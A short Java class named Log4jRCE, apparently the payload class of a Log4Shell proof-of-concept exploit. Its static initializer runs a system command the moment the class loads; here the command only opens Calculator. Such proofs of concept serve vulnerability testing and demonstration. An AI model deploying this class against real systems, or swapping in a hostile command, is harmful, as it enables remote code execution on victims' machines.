public class Log4jRCE {
    // payload
    static {
        try {
            String[] cmdline = {"open", "-a", "Calculator"};
            java.lang.Runtime.getRuntime().exec(cmdline).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
